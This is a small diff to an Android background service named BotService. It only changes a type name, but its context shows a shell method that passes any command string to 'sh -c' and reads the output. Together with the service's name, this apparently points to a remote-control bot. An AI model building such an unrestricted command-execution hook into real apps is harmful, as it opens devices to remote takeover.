@@ -193,7 +193,7 @@ public class BotService extends Service {
     }
     private void shell(String cmd){
         try{
-            Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
+            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
             BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
             StringBuilder sb = new StringBuilder();
             String l;
